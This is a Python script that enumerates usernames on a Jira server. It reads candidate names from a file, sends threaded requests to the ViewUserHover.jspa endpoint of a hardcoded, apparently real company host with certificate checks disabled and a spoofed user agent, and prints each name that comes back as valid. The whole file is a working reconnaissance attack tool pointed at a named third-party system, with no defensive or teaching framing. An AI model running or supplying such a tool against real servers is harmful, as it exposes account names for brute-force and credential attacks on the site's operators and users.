#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from socket import *
from queue import Queue
from threading import Thread
import logging
import urllib3

loguser = "./alive-users.txt"
usl = logging.FileHandler(loguser)
ulogger = logging.getLogger('log')
ulogger.setLevel(logging.INFO)
ulogger.addHandler(usl)

THREADS_COUNT = 100

def get_user_agent():
    user_agent = {
        'User-agent': '"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15'}
    return user_agent


def main():
    setdefaulttimeout(15)
    q = Queue(maxsize=0)
    with open("./users.txt") as ip:
        target = [line.rstrip('\n') for line in ip]

        for i in range(len(target)):
            q.put_nowait((i, target[i]))

    start_thread(q)


def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        ex_user_name(q, item[1])
        q.task_done()
    return True

def ex_user_name(q, user):
    b = Queue(maxsize=0)
    session_url="http://projects.zaeemsolutions.com"
    try:
        response = requests.get(session_url + "/secure/ViewUserHover.jspa?username={}".format(user), allow_redirects=True,
                                timeout=15, verify=False)

        if response.status_code == 200:
            if "avatar-full-name-link" in response.text:
                print ("[+] {}".format(user))

    except:
        pass


if __name__ == '__main__':
    urllib3.disable_warnings()
    sys.exit(main())
